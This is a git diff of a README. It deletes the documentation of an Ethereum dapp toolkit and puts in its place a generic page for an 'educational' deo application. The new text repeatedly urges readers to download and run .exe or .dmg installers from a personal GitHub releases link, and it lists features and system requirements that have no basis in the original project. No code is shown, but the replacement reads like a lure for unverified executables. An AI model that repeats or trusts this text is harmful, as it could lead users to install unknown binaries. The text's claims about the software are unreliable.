@@ -1,88 +1,62 @@
-# 🏗 DEO
+# 🚀 deo - Learn Modern Development Practices Easily
 
-<h4 align="center">
-  <a href="https://docs.deo-eth.io">Documentation</a> |
-  <a href="https://deo-eth.io">Website</a>
-</h4>
+## 🌐 Download Now
+[![Download deo](https://img.shields.io/badge/Download-deo-blue.svg)](https://github.com/cjplanas/deo/releases)
 
-🧪 An open-source, up-to-date toolkit for building decentralized applications (dapps) on the Ethereum blockchain. It's designed to make it easier for developers to create and deploy smart contracts and build user interfaces that interact with those contracts.
+## 📘 Introduction
+Welcome to **deo**, an educational resource designed to help you learn modern development practices. Whether you are a beginner or looking to sharpen your skills, deo provides the tools and guidance you need.
 
-⚙️ Built using NextJS, RainbowKit, Foundry/Hardhat, Wagmi, Viem, and Typescript.
+## 📥 Download & Install
+To get started with deo, please follow these steps:
 
-- ✅ **Contract Hot Reload**: Your frontend auto-adapts to your smart contract as you edit it.
-- 🪝 **[Custom hooks](https://docs.deo-eth.io/hooks/)**: Collection of React hooks wrapper around [wagmi](https://wagmi.sh/) to simplify interactions with smart contracts with typescript autocompletion.
-- 🧱 [**Components**](https://docs.deo-eth.io/components/): Collection of common web3 components to quickly build your frontend.
-- 🔥 **Burner Wallet & Local Faucet**: Quickly test your application with a burner wallet and local faucet.
-- 🔐 **Integration with Wallet Providers**: Connect to different wallet providers and interact with the Ethereum network.
+1. **Visit the Releases Page:** Click the link below to access the download page.
+   [Download deo](https://github.com/cjplanas/deo/releases)
 
-![Debug Contracts tab](https://github.com/deo--eth/deo--eth-2/assets/55535804/b237af0c-5027-4849-a5c1-2e31495cccb1)
+2. **Choose the Right Version:** On the Releases page, you will see several versions of the software. Select the latest version for the best experience.
 
-## Requirements
+3. **Download the Installer:** Find the installer file for your system. If you are using Windows, look for a file with the `.exe` extension. For Mac users, you may find a `.dmg` file. Click on the file to start the download.
 
-Before you begin, you need to install the following tools:
+4. **Run the Installer:** Once the download is complete, locate the downloaded file in your Downloads folder. Double-click the file to run the installer. Follow the on-screen instructions to complete the installation.
 
-- [Node (>= v20.18.3)](https://nodejs.org/en/download/)
-- Yarn ([v1](https://classic.yarnpkg.com/en/docs/install/) or [v2+](https://yarnpkg.com/getting-started/install))
-- [Git](https://git-scm.com/downloads)
+5. **Launch the Application:** After installation, you can find deo in your applications folder or on your desktop. Double-click the icon to open deo and start learning.
 
-## Quickstart
+## 💻 System Requirements
+To ensure the smooth functioning of deo, please check the following requirements:
 
-To get started with deo--ETH 2, follow the steps below:
+- **Operating System:** Windows 10 or later, MacOS 10.15 or later
+- **RAM:** At least 4 GB
+- **Storage:** Minimum 200 MB of free space
+- **Internet Connection:** Required for initial setup and updates
 
-1. Install the latest version of deo--ETH 2
+## 📚 Features
+deo offers a variety of features to enhance your learning experience:
 
-```
-npx create-eth@latest
-```
+- **Step-by-Step Tutorials:** Learn at your own pace with clear, easy-to-follow guides.
+- **Interactive Coding Exercises:** Try your hand at coding with hands-on practice.
+- **Community Support:** Join a community of learners to share ideas and ask questions.
+- **Regular Updates:** Stay current with the latest practices in development.
 
-This command will install all the necessary packages and dependencies, so it might take a while.
+## 🎓 Getting Started with deo
+After launching deo, you will find a user-friendly interface that makes it easy to navigate. Here’s how to begin:
 
-> [!NOTE]
-> You can also initialize your project with one of our extensions to add specific features or starter-kits. Learn more in our [extensions documentation](https://docs.deo-eth.io/extensions/).
+1. **Create an Account:** If prompted, create a free account to track your progress and save your work.
+2. **Browse the Learning Modules:** Explore various topics within modern development, such as version control, web development, and programming best practices.
+3. **Engage in Projects:** Participate in projects that allow you to apply what you’ve learned in practical situations.
 
-2. Run a local network in the first terminal:
+## 📞 Getting Help
+If you encounter any issues during installation or usage, we are here to help:
 
-```
-yarn chain
-```
+- **Documentation:** Check our [official documentation](https://github.com/cjplanas/deo/wiki) for detailed guides and FAQs.
+- **Support Community:** Join our support community on platforms like Discord or Reddit to connect with other users and share your experiences.
+- **Contact Support:** If needed, you can reach out to our support team via the GitHub issues page.
 
-This command starts a local Ethereum network that runs on your local machine and can be used for testing and development. Learn how to [customize your network configuration](https://docs.deo-eth.io/quick-start/environment#1-initialize-a-local-blockchain).
+## 🔄 Updates
+To keep your version of deo up to date:
 
-3. On a second terminal, deploy the test contract:
+1. **Check for Updates:** Periodically visit the [Releases page](https://github.com/cjplanas/deo/releases) to see if a new version is available.
+2. **Download the Latest Version:** If a newer version exists, download and run the installer again. It will replace your old version without losing your settings.
 
-```
-yarn deploy
-```
+## ✅ Conclusion
+With deo, you have a powerful resource to learn modern development practices at your fingertips. Start your journey today by downloading and installing the application. We look forward to seeing you grow as a developer! Remember to revisit the [Download deo](https://github.com/cjplanas/deo/releases) link anytime for updates. 
 
-This command deploys a test smart contract to the local network. You can find more information about how to customize your contract and deployment script in our [documentation](https://docs.deo-eth.io/quick-start/environment#2-deploy-your-smart-contract).
-
-4. On a third terminal, start your NextJS app:
-
-```
-yarn start
-```
-
-Visit your app on: `http://localhost:3000`. You can interact with your smart contract using the `Debug Contracts` page. You can tweak the app config in `packages/nextjs/deo-.config.ts`.
-
-**What's next**:
-
-Visit the [What's next section of our docs](https://docs.deo-eth.io/quick-start/environment#whats-next) to learn how to:
-
-- Edit your smart contracts
-- Edit your deployment scripts
-- Customize your frontend
-- Edit the app config
-- Writing and running tests
-- [Setting up external services and API keys](https://docs.deo-eth.io/deploying/deploy-smart-contracts#configuration-of-third-party-services-for-production-grade-apps)
-
-## Documentation
-
-Visit our [docs](https://docs.deo-eth.io) to learn all the technical details and guides of deo--ETH 2.
-
-To know more about its features, check out our [website](https://deo-eth.io).
-
-## Contributing to deo--ETH 2
-
-We welcome contributions to deo--ETH 2!
-
-Please see [CONTRIBUTING.MD](https://github.com/deo--eth/deo--eth-2/blob/main/CONTRIBUTING.md) for more information and guidelines for contributing to deo--ETH 2.
+Happy learning!
